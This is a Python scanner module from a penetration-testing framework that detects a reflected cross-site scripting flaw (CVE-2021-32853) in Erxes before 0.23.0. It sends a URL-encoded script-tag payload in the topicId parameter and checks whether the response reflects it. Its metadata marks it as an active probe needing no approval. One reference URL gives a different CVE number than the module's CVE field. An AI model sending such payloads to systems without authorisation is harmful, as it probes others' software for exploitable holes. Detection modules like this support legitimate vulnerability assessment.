#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Erxes before 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Erxes <0.23.0 - Cross-Site Scripting Detection',
        'description': 'Erxes before 0.23.0 contains a cross-site scripting vulnerability. The value of topicID parameter is not escaped and is triggered in the enclosing script tag.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'erxes', 'oss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://securitylab.github.com/advisories/GHSL-2021-103-erxes/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-3285',
            'https://github.com/erxes/erxes/blob/f131b49add72032650d483f044d00658908aaf4a/widgets/server/views/widget.ejs#L14',
            'https://github.com/erxes/erxes/blob/f131b49add72032650d483f044d00658908aaf4a/widgets/server/index.ts#L54',
        ],
        'cve': 'CVE-2021-32853',
    }

    def run(self):
        r = self.http_request(method="GET", path='/widgets/knowledgebase?topicId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('topic_id: "</script><script>alert(document.domain)</script>', 'window.erxesEnv',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="Erxes <0.23.0 - Cross-Site Scripting detected",
                path='/widgets/knowledgebase?topicId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

